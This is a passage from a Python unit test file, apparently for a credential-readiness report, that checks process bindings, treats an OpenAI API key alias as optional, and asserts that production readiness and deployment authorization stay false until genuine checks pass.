        for binding in plan["bindings"]:
            self.assertTrue(
                binding["target"].endswith("-process")
                or binding["target"] == "app-process"
            )
            self.assertNotIn("agent-arena", binding["target"])

    def test_openai_api_key_is_optional_presence(self):
        values = _fixture_values()
        del values["OPENAI_API_KEY"]
        aliases = _base_aliases()
        del aliases["OPENAI_API_KEY"]
        report = self._run(alias_map=aliases, values=values)
        public = report.to_public_dict()
        caps = {c["name"]: c["status"] for c in public["capabilities"]}
        self.assertEqual(caps["openai.api"], "blocked")
        # Optional: absence alone must not be the sole hard failure if other required present
        # but openai.api stays non-verified entitlement.
        self.assertNotEqual(caps.get("openai.codex"), "verified")
        openai_alias = [a for a in public["aliases"] if a["alias"] == "OPENAI_API_KEY"]
        if openai_alias:
            self.assertNotEqual(openai_alias[0]["resolution"], "blocked")

    def test_readiness_false_until_genuine_checks(self):
        report = self._run()
        public = report.to_public_dict()
        self.assertFalse(public.get("productionReady", True))
        self.assertFalse(public.get("deploymentAuthorized", True))
        self.assertEqual(public.get("productionCredentials"), "unverified")
        # Local metadata may pass while production remains unauthorized.
        self.assertIn("localMetadataOk", public)


if __name__ == "__main__":
    unittest.main()
